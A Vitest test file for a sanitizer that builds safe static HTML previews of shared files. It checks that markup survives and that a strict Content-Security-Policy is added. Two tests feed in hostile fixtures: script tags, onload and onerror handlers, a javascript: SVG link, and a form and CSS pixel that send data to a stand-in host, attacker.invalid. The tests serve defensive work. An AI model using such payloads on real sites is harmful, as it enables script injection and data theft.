import { describe, expect, it } from "vitest";
import {
	buildSpaceFileHtmlDocument,
	buildSpaceFileHtmlPreviewPath,
} from "./space-file-html-document";

function parse(html: string) {
	return new DOMParser().parseFromString(html, "text/html");
}

describe("static HTML preview documents", () => {
	it("preserves document layout, inline CSS, tables, and embedded SVG", () => {
		const source =
			'<!doctype html><html lang="en"><head><style>body { color: navy }</style></head><body style="margin: 32px"><h1>Quarterly report</h1><table><tr><td>42</td></tr></table><svg viewBox="0 0 10 10"><rect width="8" height="4" /></svg></body></html>';
		const preview = parse(buildSpaceFileHtmlDocument(source));
		expect(preview.documentElement.lang).toBe("en");
		expect(preview.querySelector("style")?.textContent).toContain(
			"color: navy"
		);
		expect(preview.body.style.margin).toBe("32px");
		expect(preview.querySelector("td")?.textContent).toBe("42");
		expect(preview.querySelector("svg rect")?.getAttribute("width")).toBe("8");
	});

	it("removes executable markup, navigation, nested documents, and form actions", () => {
		const preview = parse(
			buildSpaceFileHtmlDocument(`<html><head>
<base href="https://attacker.invalid"><meta http-equiv="refresh" content="0;url=https://attacker.invalid">
<link rel="stylesheet" href="https://attacker.invalid/style.css"></head><body onload="alert(1)">
<script>parent.postMessage('executed', '*')</script><iframe srcdoc="<script>alert(1)</script>"></iframe>
<object data="https://attacker.invalid"></object><a href="https://attacker.invalid" ping="https://attacker.invalid">Report</a>
<form action="https://attacker.invalid"><input name="secret"><button formaction="https://attacker.invalid">Send</button></form>
<svg><a xlink:href="javascript:alert(1)">SVG link</a><set attributeName="href" to="https://attacker.invalid" /></svg>
<img src="data:image/png;base64,aA==" onerror="alert(1)"></body></html>`)
		);
		expect(
			preview.querySelector(
				"script,base,link,iframe,object,form,input,button,set"
			)
		).toBeNull();
		expect(
			preview.querySelector("[href],[ping],[onload],[onerror],[formaction]")
		).toBeNull();
		expect(preview.querySelectorAll("meta")).toHaveLength(1);
		expect(preview.querySelector("img")?.getAttribute("src")).toBe(
			"data:image/png;base64,aA=="
		);
	});

	it("installs a restrictive resource policy before user styles", () => {
		const preview = parse(
			buildSpaceFileHtmlDocument(
				'<style>@import "https://attacker.invalid/style.css";p{background:url(https://attacker.invalid/pixel)}</style><p>Report</p>'
			)
		);
		const policy = preview.head.firstElementChild;
		expect(policy?.getAttribute("http-equiv")).toBe("Content-Security-Policy");
		for (const directive of [
			"default-src 'none'",
			"script-src 'none'",
			"img-src data:",
			"font-src data:",
			"base-uri 'none'",
			"form-action 'none'",
			"frame-src 'none'",
		]) {
			expect(policy?.getAttribute("content")).toContain(directive);
		}
	});

	it("links to the selected immutable revision with the same viewer context", () => {
		const path = buildSpaceFileHtmlPreviewPath({
			spaceId: "space&one",
			fileId: "report",
			revision: 3,
			profileId: "reader",
			organizationSlug: "my-team",
		});
		const url = new URL(path, "https://openmeld.ai");
		expect(url.pathname).toBe("/file-preview");
		expect(Object.fromEntries(url.searchParams)).toEqual({
			spaceId: "space&one",
			fileId: "report",
			revision: "3",
			profileId: "reader",
			organizationSlug: "my-team",
		});
	});
});
